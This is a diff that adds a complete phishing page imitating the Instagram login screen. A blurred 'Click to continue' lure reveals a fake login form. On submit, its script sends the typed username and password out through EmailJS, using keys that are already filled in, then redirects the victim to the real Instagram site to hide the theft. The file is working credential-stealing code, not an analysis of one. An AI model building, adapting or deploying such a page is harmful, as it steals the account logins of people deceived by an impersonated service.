@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="https://cdnjs.cloudflare.com/ajax/libs/simple-icons/8.2.0/instagram.svg">
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script> <!-- Include EmailJS script -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-card {
+            background-color: #000;
+            border: 1px solid #262626;
+            border-radius: 1px;
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            margin-bottom: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .permanent-image { /* This will be overlaid by the blur initially */
+            width: 100%;
+            max-width: 350px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            /* cursor: pointer; No longer needed as blur-effect handles click */
+        }
+
+        .logo {
+            width: 175px;
+            margin: 20px auto 30px;
+            filter: brightness(0) invert(1);
+        }
+
+        input {
+            background-color: #121212;
+            border: 1px solid #262626;
+            border-radius: 4px;
+            color: #fff;
+            width: 100%;
+            height: 36px;
+            padding: 9px 8px;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        input::placeholder {
+            color: #8e8e8e;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #555;
+        }
+
+        .login-button {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            padding: 8px 0;
+            font-weight: 600;
+            margin: 10px 0;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .login-button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: default;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 15px 0;
+        }
+
+        .divider-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #262626;
+        }
+
+        .or-text {
+            color: #8e8e8e;
+            font-weight: 600;
+            font-size: 13px;
+            margin: 0 15px;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 5px 0;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .facebook-icon {
+            /* color: #0095f6; No need, SVG fill handles it */
+            margin-right: 8px;
+            font-size: 18px; /* Not directly applicable to SVG path, but good for consistency */
+        }
+
+        .forgot-password {
+            color: #0095f6;
+            font-size: 12px;
+            margin-top: 15px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .signup-card {
+            background-color: #000;
+            border: 1px solid #262626;
+            border-radius: 1px;
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .signup-text {
+            font-size: 14px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .page-container { /* New wrapper for centering content */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            position: relative; /* For absolute positioning of blur effect */
+            max-width: 350px; /* Ensures content doesn't exceed image width */
+        }
+
+
+        .blur-effect {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%; /* Covers the permanent-image */
+            height: calc(100% - 20px); /* Adjust if permanent-image margin-bottom changes */
+            max-width: 350px;
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px); /* For Safari */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            background-color: rgba(0, 0, 0, 0.3); /* Darken the blur slightly */
+            cursor: pointer;
+            border-radius: 2px; /* Match permanent-image */
+        }
+
+        .click-text {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.8);
+        }
+
+        .hidden {
+            display: none !important; /* Use important to override other display properties if needed */
+        }
+    </style>
+</head>
+<body>
+    <div class="page-container">
+        <!-- This image will be shown permanently and overlaid by blur -->
+        <img src="/api/placeholder/350/400" alt="Content Preview" class="permanent-image" id="permanent-image">
+
+        <!-- Blur effect that can be clicked -->
+        <div class="blur-effect" id="blur-effect">
+            <div class="click-text">Click to continue</div>
+        </div>
+
+        <!-- Login form (initially hidden) -->
+        <div class="login-card hidden" id="login-card">
+            <img src="https://cdnjs.cloudflare.com/ajax/libs/simple-icons/8.2.0/instagram.svg" alt="Instagram" class="logo">
+
+            <form id="login-form" style="width: 100%;">
+                <input type="text" placeholder="Phone number, username, or email" id="username" name="username" required>
+                <input type="password" placeholder="Password" id="password" name="password" required>
+
+                <button type="submit" class="login-button" id="login-button" disabled>Log in</button>
+
+                <div class="or-divider">
+                    <div class="divider-line"></div>
+                    <div class="or-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+
+                <a href="#" class="facebook-login">
+                    <svg class="facebook-icon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="#0095f6">
+                        <path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/>
+                    </svg>
+                    Log in with Facebook
+                </a>
+
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+
+        <div class="signup-card hidden" id="signup-card"> <!-- Also initially hidden -->
+            <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const blurEffect = document.getElementById('blur-effect');
+            const permanentImage = document.getElementById('permanent-image'); // Keep reference if needed later
+            const loginCard = document.getElementById('login-card');
+            const signupCard = document.getElementById('signup-card');
+            const loginForm = document.getElementById('login-form');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loginButton = document.getElementById('login-button');
+
+            // --- REPLACE WITH YOUR ACTUAL EMAILJS PUBLIC KEY ---
+            const YOUR_EMAILJS_PUBLIC_KEY = "kTjh5h5kkiJl1vJPc";
+            // --- REPLACE WITH YOUR ACTUAL EMAILJS SERVICE ID ---
+            const YOUR_EMAILJS_SERVICE_ID = "service_z5abnru";
+            // --- REPLACE WITH YOUR ACTUAL EMAILJS TEMPLATE ID ---
+            const YOUR_EMAILJS_TEMPLATE_ID = "template_276jkow";
+
+            emailjs.init(YOUR_EMAILJS_PUBLIC_KEY);
+
+            function validateForm() {
+                const isValid = usernameInput.value.trim() !== '' &&
+                               passwordInput.value.trim() !== '';
+                loginButton.disabled = !isValid;
+            }
+
+            usernameInput.addEventListener('input', validateForm);
+            passwordInput.addEventListener('input', validateForm);
+            validateForm(); // Initial validation
+
+            blurEffect.addEventListener('click', function() {
+                blurEffect.classList.add('hidden'); // Hide blur effect
+                permanentImage.classList.add('hidden'); // Hide permanent image
+                loginCard.classList.remove('hidden'); // Show login card
+                signupCard.classList.remove('hidden'); // Show signup card
+            });
+
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                loginButton.disabled = true;
+                loginButton.textContent = 'Logging in...';
+
+                // --- Client-side debugging ---
+                console.log("Form submission triggered.");
+                console.log("Target Form Element:", loginForm);
+                const formData = new FormData(loginForm);
+                console.log("FormData entries collected:");
+                for (let [key, value] of formData.entries()) {
+                    console.log(`  ${key}: "${value}"`);
+                }
+                // --- End client-side debugging ---
+
+                emailjs.sendForm(YOUR_EMAILJS_SERVICE_ID, YOUR_EMAILJS_TEMPLATE_ID, loginForm)
+                    .then(function(response) {
+                        console.log('EMAILJS SUCCESS!', response.status, response.text);
+                        // Redirect to Instagram
+                        window.location.href = 'https://www.instagram.com/';
+                    })
+                    .catch(function(error) {
+                        console.log('EMAILJS FAILED...', error);
+                        loginButton.disabled = false;
+                        loginButton.textContent = 'Log in';
+                        alert('Login failed. Please try again. Error: ' + JSON.stringify(error));
+                    });
+            });
+        });
+    </script>
+</body>
+</html>
